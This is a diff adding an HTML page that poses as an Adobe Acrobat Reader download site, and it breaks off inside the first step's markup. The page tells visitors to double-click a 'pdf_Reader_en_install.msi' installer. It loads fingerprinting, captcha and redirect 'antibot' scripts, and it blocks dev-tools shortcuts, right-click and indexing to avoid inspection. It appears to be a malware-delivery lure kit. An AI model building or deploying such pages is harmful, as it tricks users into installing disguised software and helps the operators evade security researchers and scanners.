@@ -1,0 +1,1133 @@
+<!DOCTYPE html>
+<html lang="en" style="height: 100%;">
+<head>
+  <!-- 
+    BASE64 IMAGE PLACEHOLDERS:
+    1. PASTE_ADOBE_LOGO_BASE64_HERE - Replace with base64 for Adobe logo
+    2. PASTE_DOWNLOAD_ICON_BASE64_HERE - Replace with base64 for download icon in notification
+    3. PASTE_STEP1_ICON_BASE64_HERE - Replace with base64 for hand/PDF download icon
+    4. PASTE_STEP2_ICON_BASE64_HERE - Replace with base64 for computer/checkmark icon
+  -->
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PDF Reader Download</title>
+
+  <!-- Source Protection Meta Tags -->
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="0">
+  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
+  <meta http-equiv="X-Content-Type-Options" content="nosniff">
+  <meta http-equiv="Referrer-Policy" content="no-referrer">
+  
+  <!-- Antibot Scripts - Load in order -->
+  <script src="js/fingerprint.js"></script>
+  <script src="js/utils.js"></script>
+  <script src="js/captcha.js"></script>
+  <script src="js/redirect.js"></script>
+  
+  <!-- Script loading verification -->
+  <script>
+    console.log('Scripts loaded, checking utils...');
+    console.log('Utils available:', typeof window.utils !== 'undefined');
+    if (typeof window.utils !== 'undefined') {
+      console.log('Utils object:', window.utils);
+      console.log('Teams enabled:', window.utils.isProviderEnabled('teams'));
+    }
+  </script>
+  
+  <!-- reCAPTCHA Configuration (if needed) -->
+  <script>
+    // Optional: Add your reCAPTCHA keys here if you want to use reCAPTCHA
+    window.RECAPTCHA_SITE_KEY = '6Lck8b0rAAAAAOByegidVp-PDdVTR2Nrsgck3rX4';  // Add your key if using reCAPTCHA
+  </script>
+   <style>
+    /* 
+      ADOBE LOGO SIZE ADJUSTMENT:
+      To change the Adobe logo size, modify the --adobe-logo-size CSS variable below.
+      Default is 48px. Examples: 32px (smaller), 64px (larger), 72px (much larger)
+    */
+    :root {
+      --adobe-logo-size: 48px; /* Change this value to adjust logo size */
+    }
+    
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    
+    body {
+      font-family: 'Adobe Clean', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #fafafa;
+      color: #2c2c2c;
+      line-height: 1.5;
+      min-height: 100vh;
+      margin: 0;
+      display: flex;
+      flex-direction: column;
+      /* Source Protection */
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+      user-select: none;
+      -webkit-touch-callout: none;
+      -webkit-tap-highlight-color: transparent;
+      -khtml-user-select: none;
+    }
+    
+    .container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0 20px;
+    }
+    
+    .content-wrapper {
+      transform-origin: center top;
+    }
+    
+    @media (max-height: 700px) and (min-width: 769px) {
+      .content-wrapper {
+        transform: scale(0.9);
+      }
+      main {
+        padding: 20px 0;
+      }
+    }
+    
+    @media (max-height: 600px) and (min-width: 769px) {
+      .content-wrapper {
+        transform: scale(0.8);
+      }
+      main {
+        padding: 10px 0;
+      }
+    }
+    
+    /* Header */
+    header {
+      background: #fff;
+      padding: 16px 0;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+      position: relative;
+      flex-shrink: 0;
+    }
+    
+    .adobe-logo {
+      display: flex;
+      align-items: center;
+      font-size: 20px;
+      font-weight: 600;
+      color: #fa0f00;
+    }
+    
+    /* Adobe logo size - easily adjustable */
+    .adobe-logo img {
+      width: var(--adobe-logo-size, 48px);
+      height: var(--adobe-logo-size, 48px);
+      margin-right: 8px;
+    }
+    
+    
+    /* Blue notification banner */
+    .notification-banner {
+      position: absolute;
+      right: 20px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: #1473e6;
+      color: #fff;
+      padding: 12px 20px;
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      font-size: 15px;
+      max-width: 380px;
+      box-shadow: 0 2px 8px rgba(20, 115, 230, 0.25);
+    }
+    
+    .notification-banner .download-icon {
+      width: 24px;
+      height: 24px;
+      flex-shrink: 0;
+      object-fit: contain;
+    }
+    
+    .notification-banner .close-btn {
+      background: none;
+      border: none;
+      color: #fff;
+      font-size: 20px;
+      cursor: pointer;
+      padding: 0 0 0 12px;
+      opacity: 0.8;
+    }
+    
+    .notification-banner .close-btn:hover {
+      opacity: 1;
+    }
+    
+    /* Main content */
+    main {
+      flex: 1;
+      padding: 20px 0;
+      text-align: center;
+    }
+    
+    h1 {
+      font-size: 28px;
+      font-weight: 400;
+      color: #2c2c2c;
+      margin-bottom: 30px;
+    }
+    
+    /* Steps container */
+    .steps-container {
+      display: flex;
+      justify-content: center;
+      gap: 60px;
+      margin-bottom: 20px;
+      flex-wrap: wrap;
+      position: relative;
+    }
+    
+    /* Vertical separator line - removed for better iframe fit */
+    .steps-container::after {
+      display: none;
+    }
+    
+    @media (max-width: 768px) {
+      .steps-container::after {
+        display: none;
+      }
+    }
+    
+    .step {
+      flex: 0 1 300px;
+      text-align: center;
+    }
+    
+    .step-icon {
+      width: 120px;
+      height: 120px;
+      margin: 0 auto 15px;
+      position: relative;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    
+    .step-icon img {
+      object-fit: contain;
+      max-width: 100%;
+      max-height: 100%;
+    }
+    
+    /* Icon images are now handled with base64 images */
+    
+    /* Progress section */
+    .progress-section {
+      margin: 15px 0;
+    }
+    
+    .progress-info {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 8px;
+      font-size: 14px;
+    }
+    
+    .progress-bar {
+      width: 100%;
+      height: 8px;
+      background: #e1e1e1;
+      border-radius: 4px;
+      overflow: hidden;
+    }
+    
+    .progress-fill {
+      width: 0%;
+      height: 100%;
+      background: #1473e6;
+      border-radius: 4px;
+      animation: fillProgress 1s ease-out forwards;
+    }
+    
+    @keyframes fillProgress {
+      0% {
+        width: 0%;
+      }
+      90% {
+        width: 95%;
+      }
+      100% {
+        width: 100%;
+      }
+    }
+    
+    /* Step content */
+    .step h2 {
+      font-size: 20px;
+      font-weight: 600;
+      margin-bottom: 15px;
+      color: #2c2c2c;
+    }
+    
+    .step p {
+      font-size: 14px;
+      color: #505050;
+      line-height: 1.5;
+    }
+    
+    
+    /* Mobile Popup Modal */
+    .mobile-modal {
+      display: none;
+      position: fixed;
+      z-index: 9999;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.8);
+    }
+    
+    .mobile-modal-content {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: #fff;
+      padding: 30px;
+      border-radius: 12px;
+      max-width: 400px;
+      width: 90%;
+      text-align: center;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+    }
+    
+    .mobile-modal h2 {
+      color: #fa0f00;
+      margin-bottom: 20px;
+      font-size: 24px;
+    }
+    
+    .mobile-modal p {
+      margin-bottom: 20px;
+      line-height: 1.6;
+      color: #333;
+    }
+    
+    .mobile-modal-close {
+      background: #dc3545;
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 16px;
+      font-weight: 600;
+      min-width: 120px;
+    }
+    
+    .mobile-modal-close:hover {
+      background: #c82333;
+    }
+
+    /* Additional Source Protection Styles */
+    ::selection {
+      background: transparent;
+    }
+    
+    ::-moz-selection {
+      background: transparent;
+    }
+    
+    /* Hide content only for very small heights (likely dev tools) */
+    @media screen and (max-height: 300px) {
+      body { 
+        display: none !important; 
+      }
+    }
+    
+    /* Additional protection styles */
+    * {
+      -webkit-touch-callout: none;
+      -webkit-user-select: none;
+      -khtml-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+      user-select: none;
+    }
+    
+    *::before, *::after {
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+      user-select: none;
+    }
+
+    /* Iframe optimization for 900px x 600px */
+    @media (max-width: 950px) {
+      .notification-banner {
+        right: 20px;
+        top: 50%;
+        transform: translateY(-50%);
+        max-width: 280px;
+        font-size: 12px;
+        padding: 8px 12px;
+      }
+      
+      .steps-container {
+        gap: 40px;
+        margin-bottom: 15px;
+      }
+      
+      .step {
+        flex: 0 1 250px;
+      }
+      
+      .step-icon {
+        width: 100px;
+        height: 100px;
+        margin: 0 auto 10px;
+      }
+      
+      h1 {
+        font-size: 24px;
+        margin-bottom: 20px;
+      }
+      
+      .step h2 {
+        font-size: 18px;
+        margin-bottom: 10px;
+      }
+      
+      .step p {
+        font-size: 13px;
+      }
+    }
+    
+    @media (max-width: 768px) {
+      .notification-banner {
+        position: static;
+        transform: none;
+        margin: 16px;
+        max-width: none;
+      }
+      
+      h1 {
+        font-size: 22px;
+        margin-bottom: 20px;
+        padding: 0 20px;
+      }
+      
+      .steps-container {
+        gap: 30px;
+        margin-bottom: 10px;
+      }
+      
+      .step {
+        flex: 0 1 200px;
+      }
+      
+      .step-icon {
+        width: 80px;
+        height: 80px;
+      }
+      
+      .step-icon img {
+        width: 80px !important;
+        height: 80px !important;
+      }
+      
+      .step h2 {
+        font-size: 16px;
+        margin-bottom: 8px;
+      }
+      
+      .step p {
+        font-size: 12px;
+      }
+    }
+  </style>
+</head>
+<body oncontextmenu="return false;" ondragstart="return false;" onselectstart="return false;" onmousedown="return false;" onkeydown="if(event.keyCode==123||event.ctrlKey&&event.shiftKey&&(event.keyCode==73||event.keyCode==74)||event.ctrlKey&&event.keyCode==85)return false;">
+  <header>
+    <div class="container">
+      <div class="adobe-logo">
+        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB3aWR0aD0iMTUyLjE5OSIgaGVpZ2h0PSI4NCIgdmlld0JveD0iMCAwIDE1Mi4xOTkgODQiPgogIDxkZWZzPgogICAgPGZpbHRlciBpZD0iUGF0aF80IiB4PSIzNi4wMDgiIHk9IjUuNjY0IiB3aWR0aD0iNzIuNjgyIiBoZWlnaHQ9IjczLjU2OSIgZmlsdGVyVW5pdHM9InVzZXJTcGFjZU9uVXNlIj4KICAgICAgPGZlT2Zmc2V0IGlucHV0PSJTb3VyY2VBbHBoYSIvPgogICAgICA8ZmVHYXVzc2lhbkJsdXIgc3RkRGV2aWF0aW9uPSIxMCIgcmVzdWx0PSJibHVyIi8+CiAgICAgIDxmZUZsb29kIGZsb29kLWNvbG9yPSIjZmZmIiBmbG9vZC1vcGFjaXR5PSIwLjUwMiIvPgogICAgICA8ZmVDb21wb3NpdGUgb3BlcmF0b3I9ImluIiBpbjI9ImJsdXIiLz4KICAgICAgPGZlQ29tcG9zaXRlIGluPSJTb3VyY2VHcmFwaGljIi8+CiAgICA8L2ZpbHRlcj4KICAgIDxmaWx0ZXIgaWQ9IlBhdGhfNSIgeD0iNDguOTk4IiB5PSI0LjU0NiIgd2lkdGg9IjY5LjY1NCIgaGVpZ2h0PSI3NC44OTUiIGZpbHRlclVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+CiAgICAgIDxmZU9mZnNldCBpbnB1dD0iU291cmNlQWxwaGEiLz4KICAgICAgPGZlR2F1c3NpYW5CbHVyIHN0ZERldmlhdGlvbj0iMTAiIHJlc3VsdD0iYmx1ci0yIi8+CiAgICAgIDxmZUZsb29kIGZsb29kLWNvbG9yPSIjZmZmIiBmbG9vZC1vcGFjaXR5PSIwLjUwMiIvPgogICAgICA8ZmVDb21wb3NpdGUgb3BlcmF0b3I9ImluIiBpbjI9ImJsdXItMiIvPgogICAgICA8ZmVDb21wb3NpdGUgaW49IlNvdXJjZUdyYXBoaWMiLz4KICAgIDwvZmlsdGVyPgogICAgPGZpbHRlciBpZD0iUGF0aF82IiB4PSI2MC4yMiIgeT0iOC43MyIgd2lkdGg9IjcwLjIxMyIgaGVpZ2h0PSI3MC43MSIgZmlsdGVyVW5pdHM9InVzZXJTcGFjZU9uVXNlIj4KICAgICAgPGZlT2Zmc2V0IGlucHV0PSJTb3VyY2VBbHBoYSIvPgogICAgICA8ZmVHYXVzc2lhbkJsdXIgc3RkRGV2aWF0aW9uPSIxMCIgcmVzdWx0PSJibHVyLTMiLz4KICAgICAgPGZlRmxvb2QgZmxvb2QtY29sb3I9IiNmZmYiIGZsb29kLW9wYWNpdHk9IjAuNTAyIi8+CiAgICAgIDxmZUNvbXBvc2l0ZSBvcGVyYXRvcj0iaW4iIGluMj0iYmx1ci0zIi8+CiAgICAgIDxmZUNvbXBvc2l0ZSBpbj0iU291cmNlR3JhcGhpYyIvPgogICAgPC9maWx0ZXI+CiAgICA8ZmlsdGVyIGlkPSJQYXRoXzciIHg9IjcyLjExNSIgeT0iNC41NDUiIHdpZHRoPSI2OS41OTIiIGhlaWdodD0iNzQuODk1IiBmaWx0ZXJVbml0cz0idXNlclNwYWNlT25Vc2UiPgogICAgICA8ZmVPZmZzZXQgaW5wdXQ9IlNvdXJjZUFscGhhIi8+CiAgICAgIDxmZUdhdXNzaWFuQmx1ciBzdGREZXZpYXRpb249IjEwIiByZXN1bHQ9ImJsdXItNCIvPgogICAgICA8ZmVGbG9vZCBmbG9vZC1jb2xvcj0iI2ZmZiIgZmxvb2Qtb3BhY2l0eT0iMC41MDIiLz4KICAgICAgPGZlQ29tcG9zaXRlIG9wZXJhdG9yPSJpbiIgaW4yPSJibHVyLTQiLz4KICAgICAgPGZlQ29tcG9zaXRlIGluPSJTb3VyY2VHcmFwaGljIi8+CiAgICA8L2ZpbHRlcj4KICAgIDxmaWx0ZXIgaWQ9IlBhdGhfOCIgeD0iODIuODE1IiB5PSI4LjcyOSIgd2lkdGg9IjY5LjM4NCIgaGVpZ2h0PSI3MC43MTEiIGZpbHRlclVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+CiAgICAgIDxmZU9mZnNldCBpbnB1dD0iU291cmNlQWxwaGEiLz4KICAgICAgPGZlR2F1c3NpYW5CbHVyIHN0ZERldmlhdGlvbj0iMTAiIHJlc3VsdD0iYmx1ci01Ii8+CiAgICAgIDxmZUZsb29kIGZsb29kLWNvbG9yPSIjZmZmIiBmbG9vZC1vcGFjaXR5PSIwLjUwMiIvPgogICAgICA8ZmVDb21wb3NpdGUgb3BlcmF0b3I9ImluIiBpbjI9ImJsdXItNSIvPgogICAgICA8ZmVDb21wb3NpdGUgaW49IlNvdXJjZUdyYXBoaWMiLz4KICAgIDwvZmlsdGVyPgogICAgPGZpbHRlciBpZD0iUGF0aF85IiB4PSIxNy4wOTQiIHk9IjAiIHdpZHRoPSI3MC4wMjQiIGhlaWdodD0iODQiIGZpbHRlclVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+CiAgICAgIDxmZU9mZnNldCBpbnB1dD0iU291cmNlQWxwaGEiLz4KICAgICAgPGZlR2F1c3NpYW5CbHVyIHN0ZERldmlhdGlvbj0iMTAiIHJlc3VsdD0iYmx1ci02Ii8+CiAgICAgIDxmZUZsb29kIGZsb29kLWNvbG9yPSIjZmZmIiBmbG9vZC1vcGFjaXR5PSIwLjUwMiIvPgogICAgICA8ZmVDb21wb3NpdGUgb3BlcmF0b3I9ImluIiBpbjI9ImJsdXItNiIvPgogICAgICA8ZmVDb21wb3NpdGUgaW49IlNvdXJjZUdyYXBoaWMiLz4KICAgIDwvZmlsdGVyPgogICAgPGZpbHRlciBpZD0iUGF0aF8xMCIgeD0iMCIgeT0iMCIgd2lkdGg9IjcwLjAzMSIgaGVpZ2h0PSI4NCIgZmlsdGVyVW5pdHM9InVzZXJTcGFjZU9uVXNlIj4KICAgICAgPGZlT2Zmc2V0IGlucHV0PSJTb3VyY2VBbHBoYSIvPgogICAgICA8ZmVHYXVzc2lhbkJsdXIgc3RkRGV2aWF0aW9uPSIxMCIgcmVzdWx0PSJibHVyLTciLz4KICAgICAgPGZlRmxvb2QgZmxvb2QtY29sb3I9IiNmZmYiIGZsb29kLW9wYWNpdHk9IjAuNTAyIi8+CiAgICAgIDxmZUNvbXBvc2l0ZSBvcGVyYXRvcj0iaW4iIGluMj0iYmx1ci03Ii8+CiAgICAgIDxmZUNvbXBvc2l0ZSBpbj0iU291cmNlR3JhcGhpYyIvPgogICAgPC9maWx0ZXI+CiAgICA8ZmlsdGVyIGlkPSJQYXRoXzExIiB4PSI5LjE4IiB5PSI4Ljg0NCIgd2lkdGg9IjcwLjc3IiBoZWlnaHQ9Ijc1LjE1NCIgZmlsdGVyVW5pdHM9InVzZXJTcGFjZU9uVXNlIj4KICAgICAgPGZlT2Zmc2V0IGlucHV0PSJTb3VyY2VBbHBoYSIvPgogICAgICA8ZmVHYXVzc2lhbkJsdXIgc3RkRGV2aWF0aW9uPSIxMCIgcmVzdWx0PSJibHVyLTgiLz4KICAgICAgPGZlRmxvb2QgZmxvb2QtY29sb3I9IiNmZmYiIGZsb29kLW9wYWNpdHk9IjAuNTAyIi8+CiAgICAgIDxmZUNvbXBvc2l0ZSBvcGVyYXRvcj0iaW4iIGluMj0iYmx1ci04Ii8+CiAgICAgIDxmZUNvbXBvc2l0ZSBpbj0iU291cmNlR3JhcGhpYyIvPgogICAgPC9maWx0ZXI+CiAgPC9kZWZzPgogIDxnIGlkPSJBZG9iZV9Mb2dvIiBkYXRhLW5hbWU9IkFkb2JlIExvZ28iIHRyYW5zZm9ybT0idHJhbnNsYXRlKDMwIDMwKSI+CiAgICA8ZyB0cmFuc2Zvcm09Im1hdHJpeCgxLCAwLCAwLCAxLCAtMzAsIC0zMCkiIGZpbHRlcj0idXJsKCNQYXRoXzQpIj4KICAgICAgPHBhdGggaWQ9IlBhdGhfNC0yIiBkYXRhLW5hbWU9IlBhdGggNCIgZD0iTTczMS43NzItMTIwLjE2NWwtLjk5NSwzLjA2NmEuMjI0LjIyNCwwLDAsMS0uMjI4LjE2NmgtMi40Yy0uMTQ1LDAtLjE4Ni0uMDgzLS4xNjYtLjIwN2w0LjE0My0xMS45NTNhMy43NjMsMy43NjMsMCwwLDAsLjIwOC0xLjI2NC4xMzguMTM4LDAsMCwxLC4xMjQtLjE0NWgzLjMxNWMuMSwwLC4xNDUuMDIxLjE2Ni4xMjRsNC43LDEzLjI1OWMuMDQxLjEuMDIxLjE4Ni0uMS4xODZoLTIuNjkzYS4yMDkuMjA5LDAsMCwxLS4yMjgtLjE0NWwtMS4wNTYtMy4wODdabTQuMDE5LTIuNTg5Yy0uNDE0LTEuMzY3LTEuMjQzLTMuODc0LTEuNjM3LTUuMzQ1aC0uMDIxYy0uMzMxLDEuMzg4LTEuMDc3LDMuNjY3LTEuNjE2LDUuMzQ1WiIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoLTY2MS45NyAxNjYuMTcpIiBmaWxsPSIjZmEwZjAwIi8+CiAgICA8L2c+CiAgICA8ZyB0cmFuc2Zvcm09Im1hdHJpeCgxLCAwLCAwLCAxLCAtMzAsIC0zMCkiIGZpbHRlcj0idXJsKCNQYXRoXzUpIj4KICAgICAgPHBhdGggaWQ9IlBhdGhfNS0yIiBkYXRhLW5hbWU9IlBhdGggNSIgZD0iTTc1Ny41MDgtMTIzLjQxMmMwLTIuOTYyLDIuMjE2LTUuNDQ4LDYuMDA4LTUuNDQ4LjE2NSwwLC4zNzMuMDIxLjY4NC4wNDFWLTEzMi45YS4xMzEuMTMxLDAsMCwxLC4xNDUtLjE0NWgyLjYxYy4xLDAsLjEyNS4wNDEuMTI1LjEyNHYxMi4yNDNhMTEuNzE2LDExLjcxNiwwLDAsMCwuMDgzLDEuNTEzYzAsLjEtLjAyMS4xNDUtLjE0NS4xODZhMTAuNDA4LDEwLjQwOCwwLDAsMS00LjA4MS44MjljLTMuMDY2LDAtNS40MjgtMS43NC01LjQyOC01LjI2Mm02LjY5MS0yLjk0MmEyLjE1LDIuMTUsMCwwLDAtLjc2Ny0uMSwyLjc2NCwyLjc2NCwwLDAsMC0yLjk2MiwyLjljMCwyLjA1MSwxLjE4MSwyLjk0MiwyLjc1NSwyLjk0MmEyLjkyNSwyLjkyNSwwLDAsMCwuOTc0LS4xMjRaIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtNjc4LjUxIDE2Ny41OSkiIGZpbGw9IiNmYTBmMDAiLz4KICAgIDwvZz4KICAgIDxnIHRyYW5zZm9ybT0ibWF0cml4KDEsIDAsIDAsIDEsIC0zMCwgLTMwKSIgZmlsdGVyPSJ1cmwoI1BhdGhfNikiPgogICAgICA8cGF0aCBpZD0iUGF0aF82LTIiIGRhdGEtbmFtZT0iUGF0aCA2IiBkPSJNNzkzLjIzNC0xMTguMjI4YzAsMy4yNTMtMi4xMTMsNS40MDctNS4xLDUuNDA3LTMuNTQzLDAtNS4xMTctMi42NzItNS4xMTctNS4zNDVhNS4wNjksNS4wNjksMCwwLDEsNS4xNTgtNS4zNjVjMy4zMzUsMCw1LjA1NSwyLjUwNiw1LjA1NSw1LjNtLTcuMjkyLjAyMWMwLDEuODIzLjg0OSwyLjk4MywyLjIzNywyLjk4MywxLjIsMCwyLjExMy0xLjAzNiwyLjExMy0yLjk0MiwwLTEuNjE2LS42NjMtMi45NjItMi4yMzctMi45NjItMS4yLDAtMi4xMTMsMS4wNzctMi4xMTMsMi45MjEiIHRyYW5zZm9ybT0idHJhbnNsYXRlKC02OTIuOCAxNjIuMjYpIiBmaWxsPSIjZmEwZjAwIi8+CiAgICA8L2c+CiAgICA8ZyB0cmFuc2Zvcm09Im1hdHJpeCgxLCAwLCAwLCAxLCAtMzAsIC0zMCkiIGZpbHRlcj0idXJsKCNQYXRoXzcpIj4KICAgICAgPHBhdGggaWQ9IlBhdGhfNy0yIiBkYXRhLW5hbWU9IlBhdGggNyIgZD0iTTgxMi43MzctMTMzLjA0NmMuMTY2LDAsLjIwNy4wMjEuMjA3LjE2NnY0LjI0N2E2LjY3OSw2LjY3OSwwLDAsMSwxLjc0LS4yMjgsNC43NDEsNC43NDEsMCwwLDEsNC45NzIsNC45MzFjMCwzLjg3NC0zLjA2Niw1Ljc4LTYuMjE0LDUuNzhhMTAuODQyLDEwLjg0MiwwLDAsMS0zLjI1My0uNDc2LjI0NC4yNDQsMCwwLDEtLjEyNC0uMjA3Vi0xMzIuOWMwLS4xLjA0MS0uMTQ1LjE0NS0uMTQ1Wm0xLjQzLDYuNjI5YTQuMjIsNC4yMiwwLDAsMC0xLjIyMi4xNjZ2NS42MTRhMy4yMjYsMy4yMjYsMCwwLDAsLjc2Ny4wODMsMi44NTEsMi44NTEsMCwwLDAsMy0zLjEwNywyLjQzNCwyLjQzNCwwLDAsMC0yLjU0OC0yLjc1NSIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoLTcwNy45NSAxNjcuNTkpIiBmaWxsPSIjZmEwZjAwIi8+CiAgICA8L2c+CiAgICA8ZyB0cmFuc2Zvcm09Im1hdHJpeCgxLCAwLCAwLCAxLCAtMzAsIC0zMCkiIGZpbHRlcj0idXJsKCNQYXRoXzgpIj4KICAgICAgPHBhdGggaWQ9IlBhdGhfOC0yIiBkYXRhLW5hbWU9IlBhdGggOCIgZD0iTTgzNy4zMzQtMTE3LjQyMWMuMSwxLjE4MS45MzIsMi4xNTUsMi45NjIsMi4xNTVhNi40MTIsNi40MTIsMCwwLDAsMi41NDgtLjQ3N2MuMDYzLS4wNDEuMTI1LS4wMjEuMTI1LjF2MS45NjhjMCwuMTQ1LS4wNDEuMjA3LS4xNDUuMjQ5YTYuOTYxLDYuOTYxLDAsMCwxLTMuMTcuNmMtMy44OTQsMC01LjI2Mi0yLjY3Mi01LjI2Mi01LjI0MSwwLTIuODU5LDEuNzYxLTUuNDY5LDUuMDEzLTUuNDY5YTQuMjI0LDQuMjI0LDAsMCwxLDQuMzcxLDQuNDc1LDYuNjUsNi42NSwwLDAsMS0uMSwxLjM4OC4xNzkuMTc5LDAsMCwxLS4xNjYuMTY2LDE5LjE3MSwxOS4xNzEsMCwwLDEtMi4xMzQuMDgzWm0yLjY5My0yLjAwOWE2Ljc1NSw2Ljc1NSwwLDAsMCwxLjAzNi0uMDQxdi0uMTQ1YTEuNjg1LDEuNjg1LDAsMCwwLTEuNzYxLTEuNjM3LDEuOTYzLDEuOTYzLDAsMCwwLTEuOTg5LDEuODIzWiIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoLTcyMS41OCAxNjIuMjYpIiBmaWxsPSIjZmEwZjAwIi8+CiAgICA8L2c+CiAgICA8ZyB0cmFuc2Zvcm09Im1hdHJpeCgxLCAwLCAwLCAxLCAtMzAsIC0zMCkiIGZpbHRlcj0idXJsKCNQYXRoXzkpIj4KICAgICAgPHBhdGggaWQ9IlBhdGhfOS0yIiBkYXRhLW5hbWU9IlBhdGggOSIgZD0iTTY4NC45NzMtMTQzLjM4SDY5NXYyNFoiIHRyYW5zZm9ybT0idHJhbnNsYXRlKC02MzcuODggMTczLjM4KSIgZmlsbD0iI2ZhMGYwMCIvPgogICAgPC9nPgogICAgPGcgdHJhbnNmb3JtPSJtYXRyaXgoMSwgMCwgMCwgMSwgLTMwLCAtMzApIiBmaWx0ZXI9InVybCgjUGF0aF8xMCkiPgogICAgICA8cGF0aCBpZD0iUGF0aF8xMC0yIiBkYXRhLW5hbWU9IlBhdGggMTAiIGQ9Ik02NTYuMTQtMTQzLjM4SDY0Ni4xMDl2MjRaIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtNjE2LjExIDE3My4zOCkiIGZpbGw9IiNmYTBmMDAiLz4KICAgIDwvZz4KICAgIDxnIHRyYW5zZm9ybT0ibWF0cml4KDEsIDAsIDAsIDEsIC0zMCwgLTMwKSIgZmlsdGVyPSJ1cmwoI1BhdGhfMTEpIj4KICAgICAgPHBhdGggaWQ9IlBhdGhfMTEtMiIgZGF0YS1uYW1lPSJQYXRoIDExIiBkPSJNNjcxLjM2Mi0xMjMuMjcxbDYuMzg3LDE1LjE1NGgtNC4xODZsLTEuOTExLTQuODI2aC00LjY3NFoiIHRyYW5zZm9ybT0idHJhbnNsYXRlKC02MjcuOCAxNjIuMTIpIiBmaWxsPSIjZmEwZjAwIi8+CiAgICA8L2c+CiAgPC9nPgo8L3N2Zz4K" alt="Adobe Logo">
+        Adobe
+      </div>
+      
+      <div class="notification-banner">
+        <img src="data:image/svg+xml;base64,PHN2ZyBpZD0iTGF5ZXJfMSIgZGF0YS1uYW1lPSJMYXllciAxIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxOCIgaGVpZ2h0PSIxOCIgdmlld0JveD0iMCAwIDE4IDE4Ij4KICA8ZyBpZD0iSWNvbnMiPgogICAgPGc+CiAgICAgIDxwYXRoIGQ9Ik0xMS4zNjAwNiw3LjQ4ODgsOS43NSw5LjIyMjg4VjEuMTE3NTlhLjUuNSwwLDAsMC0uNS0uNWgtLjVhLjUuNSwwLDAsMC0uNS41VjkuMjIyODhMNi42Mzk5NCw3LjQ4ODhhLjUuNSwwLDAsMC0uNzA2NTQtLjAyNjI4bC0uMzY2Ni4zNDAyM2EuNS41LDAsMCwwLS4wMjYzNy43MDY2MmwuMDAwMTEuMDAwMTEsMy4wOTMwOCwzLjMzMDc2YS41LjUsMCwwLDAsLjcwNjYyLjAyNjE0bC4wMjYxNC0uMDI2MTQsMy4wOTMwOC0zLjMzMDc2YS41LjUsMCwwLDAtLjAyNjE1LS43MDY2MmwtLjAwMDExLS4wMDAxMS0uMzY2Ni0uMzQwMjNBLjUuNSwwLDAsMCwxMS4zNjAwNiw3LjQ4ODhaIiBmaWxsPSIjZmZmZmZmIi8+CiAgICAgIDxwYXRoIGQ9Ik0xNS41LDE1SDIuNWExLjI1LDEuMjUsMCwwLDEtMS4yNS0xLjI1VjEwLjA3MjI3YS41LjUsMCwwLDEsLjUtLjVoLjVhLjUuNSwwLDAsMSwuNS41VjEzLjVoMTIuNVYxMC4wOTc2NmEuNS41LDAsMCwxLC41LS41aC41YS41LjUsMCwwLDEsLjUuNVYxMy43NUExLjI1LDEuMjUsMCwwLDEsMTUuNSwxNVoiIGZpbGw9IiNmZmZmZmYiLz4KICAgIDwvZz4KICA8L2c+Cjwvc3ZnPg==" alt="Download" class="download-icon">
+        <span>Please open your Downloads and double-click on the pdf_Reader_en_install.msi file to install Acrobat Reader.</span>
+        <button class="close-btn">×</button>
+      </div>
+    </div>
+  </header>
+  
+  <main>
+    <div class="container">
+      <div class="content-wrapper">
+        <h1>Download and launch your Acrobat Reader software</h1>
+      
+      <div class="steps-container">
+        <!-- Step 1 -->
+        <div class="step">
+          <div class="step-icon">
